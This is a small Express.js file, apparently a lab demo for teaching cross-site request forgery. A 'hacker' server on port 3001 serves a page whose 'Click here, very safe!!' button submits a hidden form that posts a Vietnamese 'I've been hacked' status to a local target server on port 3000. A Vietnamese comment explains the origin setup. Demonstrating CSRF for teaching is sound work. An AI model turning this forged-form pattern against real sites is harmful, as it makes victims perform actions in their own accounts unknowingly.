import express from 'express';

const app = express();

app.get('/', (req, res) => {
  res.send(`
  <html>
    <h1>This is trusted website</h1>
    <a href='/trust-me-bro'>Click here</a>
  </html>`);
});

app.get('/trust-me-bro', (req, res) => {
  res.send(`
    <html><body>
    <form action='http://localhost:3000/status' method='post'>
      <input type="text" name="content" value='Tôi hồ đồ quá, tôi đã bị hack' style="display: none" />
      <button type="submit">Click here, very safe!!</button>
    </form>
    </body></html>
    `);
});

app.listen(3001, () => {
  console.log(`Hacker serer is running on port 3001`);
});

/**
 * File server hacker.js chạy tại http://127.0.0.1:3001 (sở dĩ mình không để link localhost vì nó sẽ cũng domain với cái server facebook trên, nên chúng ta sẽ không test được)
 */
